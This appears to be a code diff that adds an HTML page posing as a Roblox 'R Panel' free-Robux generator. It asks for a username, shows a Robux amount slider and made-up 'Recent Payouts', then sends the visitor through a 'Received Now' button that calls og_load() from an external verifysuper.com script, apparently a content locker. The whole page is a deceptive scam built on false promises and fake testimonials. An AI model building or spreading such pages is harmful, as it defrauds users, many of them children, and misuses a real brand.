@@ -1,0 +1,432 @@
+<html>
+
+<head>
+<title>2ROpen</title>
+<meta name="description" content="private">
+<meta name="referrer" content="no-referrer">
+
+<style>
+    body {
+        margin: 0;
+        font-family: Roboto, sans-serif;
+        color: #444;
+    }
+
+    .header_blue {
+        background: #1565c0;
+        padding: 80px 0 20px;
+        color: #fff;
+        font-size: 48px;
+        font-weight: 300;
+        margin-bottom: 40px;
+        text-align: center; /* Center align header text */
+    }
+
+    .header_text {
+        width: 80%;
+        margin: 0 auto; /* Center align header text */
+    }
+
+    .unlockBtn {
+        background: #2196f3;
+        border: none;
+        border-radius: 2px;
+        box-shadow: 0 3px 6px rgba(0, 0, 0, .16), 0 3px 6px rgba(0, 0, 0, .23);
+        min-height: 31px;
+        min-width: 70px;
+        padding: 2px 16px;
+        text-align: center;
+        text-transform: uppercase;
+        transition: all 280ms ease;
+        cursor: pointer;
+        font: 500 14px/31px Roboto, sans-serif; /* Removed !important */
+        color: white;
+        display: inline-block;
+        vertical-align: middle;
+        outline: 0;
+        -webkit-appearance: none;
+    }
+
+    .unlockBtn:hover {
+        box-shadow: 0 3px 6px rgba(0, 0, 0, .16), 0 3px 6px rgba(0, 0, 0, .23);
+    }
+
+    .content-container {
+        width: 80%;
+        margin: 0 auto;
+    }
+
+    @font-face {
+        font-family: 'Roboto';
+        font-style: normal;
+        font-weight: 300;
+        src: local('Roboto Light'), local(Roboto-Light),
+        url(http://fonts.gstatic.com/s/roboto/v15/Pru33qjShpZSmG3z6VYwnRJtnKITppOI_IvcXXDNrsc.woff2) format('woff2');
+        unicode-range: U+0100-024F, U+1E00-1EFF, U+20A0-20AB, U+20AD-20CF, U+2C60-2C7F, U+A720-A7FF;
+    }
+
+    @font-face {
+        font-family: 'Roboto';
+        font-style: normal;
+        font-weight: 300;
+        src: local('Roboto Light'), local(Roboto-Light),
+        url(//fonts.gstatic.com/s/roboto/v15/Hgo13k-tfSpn0qi1SFdUfVtXRa8TVwTICgirnJhmVJw.woff2) format('woff2');
+        unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2212, U+2215, U+E0FF, U+EFFD, U+F000;
+    }
+
+    @font-face {
+        font-family: 'Roboto';
+        font-style: normal;
+        font-weight: 500;
+        src: local('Roboto Medium'), local(Roboto-Medium),
+        url(//fonts.gstatic.com/s/roboto/v15/oOeFwZNlrTefzLYmlVV1UBJtnKITppOI_IvcXXDNrsc.woff2) format('woff2');
+        unicode-range: U+0100-024F, U+1E00-1EFF, U+20A0-20AB, U+20AD-20CF, U+2C60-2C7F, U+A720-A7FF;
+    }
+
+    @font-face {
+        font-family: 'Roboto';
+        font-style: normal;
+        font-weight: 500;
+        src: local('Roboto Medium'), local(Roboto-Medium),
+        url(//fonts.gstatic.com/s/roboto/v15/RxZJdnzeo3R5zSexge8UUVtXRa8TVwTICgirnJhmVJw.woff2) format('woff2');
+        unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2212, U+2215, U+E0FF, U+EFFD, U+F000;
+    }
+</style>
+ 
+
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <script type="text/javascript" id="ogjs" src="https://verifysuper.com/cl/js/j6v1nv"></script>
+
+</head>
+<body id="rbx-body" class="rbx-body   light-theme gotham-font" data-performance-relative-value="0.005" data-internal-page-name="" data-send-event-percentage="0">
+
+ 
+   <link href="https://images.rbxcdn.com/23421382939a9f4ae8bbe60dbe2a3e7e.ico.gzip" rel="icon">
+
+
+      <link onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" rel="stylesheet" data-bundlename="StyleGuide" href="css/39823e832391dcd9b5afa8f061de15365dd5391454e23931fd9acd626e34b019.css">
+
+      <link onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" rel="stylesheet" data-bundlename="Thumbnails" href="css/872e08cfb833578ce262269ca0c40e46d6888d5abb201cf238fe00f9abfba826.css">
+
+      <link onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" rel="stylesheet" data-bundlename="Footer" href="css/55b250e8473888792f885d898973a13692fb22157baf61aaffa62ce4545f3408.css">
+
+      <style>
+          .page-top {
+              margin: 60px auto;
+              padding: 12px;
+              width: 970px;
+              background-image: url("bg.png");
+              background-size: auto auto;
+              background-repeat: no-repeat;
+              color: #fff !important;
+              text-align: center;
+          }
+
+          @media (max-width: 991px) {
+              .page-top {
+                  width:100%
+              }
+
+              .page-top,.page-top .sg-section {
+                  padding: 12px 0
+              }
+          }
+
+          @media (max-width: 767px) {
+              .page-top {
+                  margin:40px auto
+              }
+          }
+
+          .recent-winners {
+             background-color: #f2f4f5 !important;
+         }
+
+     </style>
+
+
+     <link onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" rel="stylesheet" href="https://static.rbxcdn.com/css/page___80400f5d6146e08bcf1e66a17ee0554e_m.css/fetch">
+     <link onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" rel="stylesheet" data-bundlename="StyleGuideReference" href="css/8d58c6cc2c654dbcb6b880e41955f95de3bd6a68315348c536e54f3a7e7ab6eb.css">
+     <link onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" rel="stylesheet" data-bundlename="FileUpload" href="css/7e4ee4f2bf98b3716c4e33a03505aadc7f2179b191b8ed35816e2ed09a2771c6.css">
+     <link onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" rel="stylesheet" data-bundlename="RobuxIcon" href="css/af4a705d9238d48149768cbd4724797649ca06ff6dbf0b05feab30c7825997be.css">
+
+
+
+<script type="text/javascript">
+  var Roblox = Roblox || {};
+  Roblox.GaEventSettings = {
+      gaDFPPreRollEnabled: "false" === "true",
+      gaLaunchAttemptAndLaunchSuccessEnabled: "false" === "true",
+      gaPerformanceEventEnabled: "false" === "true"
+  };
+</script>
+
+
+
+<script onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="headerinit" type="text/javascript" src="js/799efe9bfd5be7618e023fc94f1b1b84.js"></script>
+<script onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="HeaderScripts" type="text/javascript" src="js/db5218c3fbccfaa300942c9c11f581d29079dcf3d27e2b69c410f10ba3aff8d4.js"></script>
+
+  <script>
+  //Set if it browser's do not track flag is enabled
+  var Roblox = Roblox || {};
+  (function() {
+      var dnt = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      if (typeof window.external !== "undefined" &&
+          typeof window.external.msTrackingProtectionEnabled !== "undefined") {
+          dnt = dnt || window.external.msTrackingProtectionEnabled();
+  }
+  Roblox.browserDoNotTrack = dnt == "1" || dnt == "yes" || dnt === true;
+})();
+</script>
+ 
+<style>
+  @media screen and (max-width: 768px){
+      .page-top {
+          background-size: cover !important;
+      }
+      .sg-container, .sg-container .sg-section {
+          padding: 20px 20px;
+      }
+      .sg-container {
+  margin: 0px auto;
+}
+#footer .small-oneline {
+  overflow: hidden;
+  text-overflow: unset;
+  white-space: unset;
+  padding: 0 20px;
+}
+.container.sg-container.page-top.ng-scope {
+  padding: 40px 20px;
+}
+div#simplemodal-container {
+  left: -18px !important;
+  right: 0 !important;
+  top: 30% !important;
+  text-align: center !important;
+}
+  }
+</style>
+ 
+<div id="roblox-linkify" data-enabled="true" data-regex="(https?\:\/\/)?(?:www\.)?([a-z0-9-]{2,}\.)*(((m|de|www|web|api|blog|wiki|corp|polls|bloxcon|developer|devforum|forum)\.roblox\.com|robloxlabs\.com)|(www\.shoproblox\.com)|(rblx\.co)|help\.roblox\.com(?![A-Za-z0-9\/.]*\/attachments\/))(?!\/[A-Za-z0-9-+&amp;@#\/=~_|!:,.;]*%)((\/[A-Za-z0-9-+&amp;@#\/%?=~_|!:,.;]*)|(?=\s|\b))" data-regex-flags="gm" data-as-http-regex="(([^.]help|polls)\.roblox\.com)"></div>
+
+<div id="image-retry-data" data-image-retry-max-times="30" data-image-retry-timer="500" data-ga-logging-percent="10">
+</div>
+<div id="http-retry-data" data-http-retry-max-timeout="0" data-http-retry-base-timeout="0" data-http-retry-max-times="1">
+</div>
+
+
+<div class="navigation" id="navigation">
+  <div class="sg-header navbar-header rbx-header">
+      <span id="menu-btn" class="icon-menu"></span>
+      <a href="#" class="nav-logo"><div class="icon-logo"></div></a>
+  </div>
+</div>
+
+
+
+
+<div class="container sg-container page-top ng-scope">
+   <h1>R Panel</h1>
+  <p style="color: #fff !important;">Connect your ROBLOX account by entering your username to begin! You will be able to choose any amount of Robux you would like, and you will then be prompted to join the group.
+
+Robux can be used for testing purposes, or to purchase accessories and gamepasses!
+  <br><br>
+</div>
+
+<div class="container sg-container ng-scope">
+ 
+<div id="step1"><h3 class="doc-heading" id="roblox-username">ROBLOX Username</h3><div class="form-group"><input class="form-control input-field" id="username" name="username" placeholder="Enter your ROBLOX username"><br><button type="button" class="btn-cta-lg" onclick="step2()">Next</button></div></div>
+<div id="step2" style="display:none;"><h3 class="doc-heading" id="robux-amount">Robux Amount</h3><p>Paying out user: <b id="confirm-payout">$user</b></p><div class="form-group"><input id="amount" type="range" step="10" min="10" max="100" value="10" onchange="calculatepoints(document.getElementById('amount').value)"></div><div class="small-oneline text">You will receive: <span class="icon-robux-16x16"></span><span class="text-robux" id="reward-amount">10K+</span></div><button type="button" class="btn-cta-lg" onclick="step3()">Next</button></div>
+<div id="step3" style="display:none;"><h3 class="doc-heading" id="join-group">Received Now</h3><p>We have confirmed your Robux order! Click the button below to join the admin group and instantly receive your payout. The account <b id="confirm-acc">$user</b> will receive <b id="confirm-amount">$amount</b> Robux!</p><br><button type="button" class="btn-growth-lg" onclick="og_load();">Received Now</button></div>
+
+  
+</div>
+
+<div class="container sg-container recent-winners ng-scope">
+  <h4>Recent Payouts</h4><br>
+  <ul class="hlist avatar-cards">
+    <li class="list-item avatar-card">
+      <div class="avatar-card-container">
+        <div class="avatar-card-fullbody">
+          <a href="https://www.roblox.com/users/80254/profile" target="_blank" class="avatar-card-link">
+            <span class="avatar-card-image thumbnail-2d-container"><img class="avatar-card-image" src="https://tr.rbxcdn.com/78409bba70e934f7d6549e44f7de9e2a/150/150/AvatarHeadshot/Png" alt=""></span>
+        </a>
+        <a href="#" class="avatar-status game">
+            <span class="icon-game"></span>
+        </a>
+    </div>
+    <div class="avatar-card-caption">
+      <div class="text-overflow avatar-name">Stickmasterluke</div>
+      <div class="avatar-card-label">Received 100K+ Robux</div>
+      <span class="avatar-status-container">
+        <div class="avatar-card-label"></div>
+        <a href="#" class="text-link text-overflow avatar-status-link"></a>
+    </span>
+</div>
+
+</div>
+</li>
+
+<li class="list-item avatar-card">
+  <div class="avatar-card-container">
+    <div class="avatar-card-fullbody">
+      <a href="https://www.roblox.com/users/7733466/profile" target="_blank" class="avatar-card-link">
+        <span class="avatar-card-image thumbnail-2d-container"><img class="avatar-card-image" src="https://tr.rbxcdn.com/98c6621ffd47c0fa7a533c6bc60088e2/150/150/AvatarHeadshot/Png" alt="">
+</span>
+    </a>
+    <a href="#" class="avatar-status online">
+        <span class="icon-online"></span>
+    </a>
+</div>
+<div class="avatar-card-caption">
+  <div class="text-overflow avatar-name">ceoyaser</div>
+  <div class="avatar-card-label">Received 40K+ Robux</div>
+  <span class="avatar-status-container">
+    <div class="avatar-card-label"></div>
+</span>
+</div>
+
+</div>
+</li>
+
+<li class="list-item avatar-card">
+  <div class="avatar-card-container">
+    <div class="avatar-card-fullbody">
+      <a href="https://www.roblox.com/users/153/profile" target="_blank" class="avatar-card-link">
+        <span class="avatar-card-image thumbnail-2d-container"><img class="avatar-card-image" src="https://tr.rbxcdn.com/9dd98e682ddb95b44017ea82432aca5e/150/150/AvatarHeadshot/Png" alt=""></span>
+    </a>
+    <a href="#" class="avatar-status online">
+        <span class="icon-online"></span>
+    </a>
+</div>
+<div class="avatar-card-caption">
+  <div class="text-overflow avatar-name">mrflimflam</div>
+  <div class="text-overflow avatar-card-label">Received 80K Robux</div>
+  <span class="avatar-status-container"></span>
+</div>
+
+</div>
+</li>
+
+</ul>
+</div>
+
+
+<div id="lol" style="display:none;">
+<div id="loading-modal" class="simplemodal-overlay" style="background-color: rgb(0, 0, 0); opacity: 0.8; height: 100%; width: 100%; position: fixed; left: 0px; top: 0px; z-index: 1041;"></div>
+<div id="simplemodal-container" class="simplemodal-container" style="position: fixed; z-index: 1042; height: 273px; width: 400px; left: 40%;  top: 30%;"><a class="modalCloseImg simplemodal-close" title="Close"></a><div tabindex="-1" class="simplemodal-wrap" style="height: 100%; outline: 0px; width: 100%; overflow: visible;"><div id="modal-confirmation" class="modal-confirmation noImage protocolhandler-starting-modal simplemodal-data" data-modal-type="confirmation" style="display: block;">
+  <div id="modal-dialog" class="modal-dialog">
+      <div class="modal-content">
+          <div class="modal-header"><button type="button" class="close" data-dismiss="modal" style="display: none;"> <span aria-hidden="true"><span class="icon-close"></span></span><span class="sr-only">Close</span>
+          </button>
+          <h5 class="modal-title"></h5>
+      </div>
+      <div class="modal-body">
+          <div class="modal-top-body">
+              <div class="modal-message"><span class="icon-logo-r-95"></span><p id="oof">Searching for user: $user</p><span class="spinner spinner-default"></span></div>
+              <div class="modal-image-container roblox-item-image" data-image-size="medium" data-no-overlays="" data-no-click=""><img class="modal-thumb" alt="generic image"></div>
+              <div class="modal-checkbox checkbox" style="display: none;"><input id="modal-checkbox-input" type="checkbox"> <label for="modal-checkbox-input"></label></div>
+          </div>
+
+
+      </div>
+      <div class="modal-footer text-footer" style="display: none;"></div>
+  </div>
+</div>
+</div></div></div>
+
+<script type="text/javascript" src="index.js"></script>
+
+
+<script onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="intl-polyfill" type="text/javascript" src="js/d44520f7da5ec476cfb1704d91bab327.js"></script>
+
+
+<script onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="InternationalCore" type="text/javascript" src="js/ff3308aa2e909de0f9fcd5da7b529db247f69fe9b4072cbbc267749800a4d9e6.js"></script>
+
+
+<script onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="TranslationResources" type="text/javascript" src="js/73a89de8a6dbe8005fb3d6be12e361fddac57c13295171d3a8d5f397e761615d.js"></script>
+
+
+
+<script onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="leanbase" type="text/javascript" src="js/ae8d0d21c550c324dc661544fec136da.js"></script>
+
+
+<script onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="CoreUtilities" type="text/javascript" src="js/9735308cd1d9b0dde36c61ac00873b6885e5fadb17869c79ca1846ed879910ab.js"></script>
+
+
+<script onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="CoreRobloxUtilities" type="text/javascript" src="js/696685bfb3ef15707c494828d9ffe1d607cb32746b9478dc4b165ff2c40b4e7f.js"></script>
+
+
+
+<script onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="React" type="text/javascript" src="js/45841f2140bdbf6302237530383db2c6bfd938c7138a085cea83fb5f4c03086c.js"></script>
+
+<script onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="ReactUtilities" type="text/javascript" src="js/898cb6e9c467d15ad80a67d019f3815d35dbc6ff60c12ef7dd928e8fbaf02b0b.js"></script>
+
+<script onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="ReactStyleGuide" type="text/javascript" src="js/132449c053f66a1a82a3c7f99496355b024e449d688285dc66d92f7fd672fe25.js"></script>
+
+<script onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="angular" type="text/javascript" src="js/ae3d621886e736e52c97008e085fa286.js"></script>
+
+<script onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="AngularJsUtilities" type="text/javascript" src="js/0997b4b967345e5a2c5fc01dd196a4866a5bf415b0650a6382630d397dd5fefe.js"></script>
+
+
+<script onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="InternationalAngularJs" type="text/javascript" src="js/95f7afb5fcb3c8ae379d51661e32c54ea8d8b823ace7574bd0b7fab9275cba6b.js"></script>
+
+
+
+<script onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="Thumbnails" type="text/javascript" src="js/18bacc6af9c2d138889720464760d97f7535b7c8beb298379e65834559b03d01.js"></script>
+
+
+<div ng-modules="baseTemplateApp" class="ng-scope">
+  <script type="text/javascript" src="js/ffcc04436179c6b2a6668fdfcfbf62b1.js"></script>
+</div>
+
+<div ng-modules="pageTemplateApp" class="ng-scope">
+  <script type="text/javascript" src="js/f95ce5eaf14ed24abcf0291464ea2cf0.js"></script>
+</div>
+
+
+
+
+
+<script type="text/javascript">Roblox.config.externalResources = [];Roblox.config.paths['Pages.Catalog'] = 'js/cafca5e807a6864149a01d3e510763d3.js';Roblox.config.paths['Pages.CatalogShared'] = 'js/daeddd9f7ee5728711b717cc62326f34.js';Roblox.config.paths['Widgets.AvatarImage'] = 'js/7d49ac94271bd506077acc9d0130eebb.js';Roblox.config.paths['Widgets.DropdownMenu'] = 'js/da553e6b77b3d79bec37441b5fb317e7.js';Roblox.config.paths['Widgets.GroupImage'] = 'js/8ad41e45c4ac81f7d8c44ec542a2da0a.js';Roblox.config.paths['Widgets.HierarchicalDropdown'] = 'js/4a0af9989732810851e9e12809aeb8ad.js';Roblox.config.paths['Widgets.ItemImage'] = 'js/61a0490ba23afa17f9ecca2a079a6a57.js';Roblox.config.paths['Widgets.PlaceImage'] = 'js/a6df74a754523e097cab747621643c98.js';</script>
+
+
+<script onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="page" type="text/javascript" src="js/a04e739a72565e4e9e62b9ff16ebfb62.js"></script>
+
+<script onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="StyleGuide" type="text/javascript" src="js/a3c4eda0d34c454749990f0587a5ecbaff70a560fabf7e57943b2184436da3ad.js"></script>
+
+<script onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="Footer" type="text/javascript" src="js/938431571ac213ef2c1933845edcb0b044e7bdf95340cf45f8ab84580aeb1e12.js"></script>
+
+<script onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="SystemFeedback" type="text/javascript" src="js/aac542106f7f77697cbc3b36ab3cf0619bf9b69a1af0983e59dfeb6c36652d3b.js"></script>
+
+<script onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="FileUpload" type="text/javascript" src="js/0e6d0c239b3da1c0408920b3dea6d2e0f7a56b1fc7967d4b1d2f59635b3a2c5b.js"></script>
+
+<script onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="GameLaunch" type="text/javascript" src="js/ee062fc723e5339797b723822692537de5ea093289178a923fc3bbf5775a7ff3.js"></script>
+
+<script onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="pageEnd" type="text/javascript" src="js/8d28bd28c1eb78b98b3edfa661ff8dd4.js"></script>
+
+
+
+
+</div>
+
+<script src="ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script type="text/javascript">
+ 
+</script>
+
+
+<script type="text/javascript">
+  $(document).ready(function(){
+//Javascript Here
+
+});
+</script>
+ 
+
+ 
+</div></body>
+ 
+</html>
